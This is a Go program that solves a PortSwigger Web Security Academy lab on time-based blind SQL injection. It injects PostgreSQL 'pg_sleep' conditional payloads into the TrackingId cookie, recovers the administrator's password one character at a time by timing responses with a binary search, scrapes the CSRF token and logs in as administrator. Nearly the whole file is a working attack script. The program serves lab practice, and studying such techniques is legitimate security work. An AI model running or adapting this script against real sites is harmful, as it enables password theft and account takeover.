// https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"
)

func main() {
	err := solve()
	if err != nil {
		log.Fatalln(err)
	}
}

func solve() error {
	client, err := newClient()
	if err != nil {
		return err
	}

	u := "https://0adc005f03badd0fc0681af300530003.web-security-academy.net"
	loginUrl := u + "/login"

	trackingIdCookie, err := trackingIdCookie(u, client)
	if err != nil {
		return err
	}

	pass, err := adminPassword(u, trackingIdCookie, client)
	if err != nil {
		return err
	}
	fmt.Println("Admin password:", pass)

	csrfToken, err := parseCSRFToken(loginUrl, client)
	if err != nil {
		return err
	}

	return login(loginUrl, "administrator", pass, csrfToken, client)
}

func trackingIdCookie(u string, client *http.Client) (*http.Cookie, error) {
	resp, err := client.Get(u)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode/100 != 2 {
		return nil, fmt.Errorf("Status: %v", resp.Status)
	}

	u2, err := url.Parse(u)
	if err != nil {
		return nil, err
	}

	cookies := client.Jar.Cookies(u2)
	for _, c := range cookies {
		fmt.Println(c)
		if c.Name == "TrackingId" {
			return c, nil
		}
	}

	return nil, fmt.Errorf("TrackingId cookie not found")
}

var alphaNumChars = "0123456789abcdefghijklmnopqrstuvwxyz"

func adminPassword(u string, trackingIdCookie *http.Cookie, client *http.Client) (string, error) {
	u2, err := url.Parse(u)
	if err != nil {
		return "", err
	}

	pass := &strings.Builder{}
	for i := 1; i <= 20; i++ {
		left := 0
		right := len(alphaNumChars) - 1

		for {
			middle := left + ((right - left) / 2)
			c := alphaNumChars[middle]

			var trCookie http.Cookie
			trCookie = *trackingIdCookie

			// clear
			trCookie.Value = ""
			trCookie.Expires = time.Unix(0, 0)
			client.Jar.SetCookies(u2, []*http.Cookie{&trCookie})

			ok, err := compareChar(u, trackingIdCookie, 0, i, c, client)
			if err != nil {
				return "", err
			}
			if ok {
				pass.WriteByte(c)
				break
			}

			ok, err = compareChar(u, trackingIdCookie, -1, i, c, client)
			if err != nil {
				return "", err
			}
			if ok {
				right = middle - 1
				continue
			}
			left = middle + 1
		}
	}
	return pass.String(), nil
}

func compareChar(u string, trackingIdCookie *http.Cookie, cmpMode int, i int, c byte, client *http.Client) (bool, error) {
	var trCookie http.Cookie
	trCookie = *trackingIdCookie

	if cmpMode == 0 {
		trCookie.Value = trackingIdCookie.Value + "'||(SELECT CASE WHEN (SELECT SUBSTRING(password," + strconv.Itoa(i) + ",1)='" + string(c) + "' FROM users WHERE username='administrator') THEN pg_sleep(5)||'' ELSE '' END)||'"
	} else if cmpMode < 0 {
		trCookie.Value = trackingIdCookie.Value + "'||(SELECT CASE WHEN (SELECT SUBSTRING(password," + strconv.Itoa(i) + ",1)<'" + string(c) + "' FROM users WHERE username='administrator') THEN pg_sleep(5)||'' ELSE '' END)||'"
	} else {
		trCookie.Value = trackingIdCookie.Value + "'||(SELECT CASE WHEN (SELECT SUBSTRING(password," + strconv.Itoa(i) + ",1)>'" + string(c) + "' FROM users WHERE username='administrator') THEN pg_sleep(5)||'' ELSE '' END)||'"
	}

	fmt.Println(trCookie.Value)

	req, err := http.NewRequest("GET", u, nil)
	if err != nil {
		return false, err
	}
	// to avoid adding double quotes around the value
	req.Header.Add("Cookie", trCookie.Name+"="+trCookie.Value)

	start := time.Now()
	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()
	end := time.Now()
	respTime := end.Sub(start)
	return respTime > time.Second*4, nil
}

var csrfRE *regexp.Regexp = regexp.MustCompile(`name="csrf" value="([^"]+)"`)

func parseCSRFToken(url string, client *http.Client) (string, error) {
	resp, err := client.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode/100 != 2 {
		return "", fmt.Errorf("Status: %v", resp.Status)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	//fmt.Println(string(body))

	return string(csrfRE.FindSubmatch(body)[1]), nil
}

func login(u, username, password, csrfToken string, client *http.Client) error {
	resp, err := client.PostForm(u, url.Values{"username": {"administrator"}, "password": {password}, "csrf": {csrfToken}})
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode/100 != 2 {
		return fmt.Errorf("Status: %v", resp.Status)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	_, err = fmt.Println(string(body))
	return err
}

func newClient() (*http.Client, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}

	//u2, _ := url.Parse("http://127.0.0.1:8888")

	return &http.Client{
		Jar: jar,
		//Transport: &http.Transport{Proxy: http.ProxyURL(u2)},
	}, nil
}
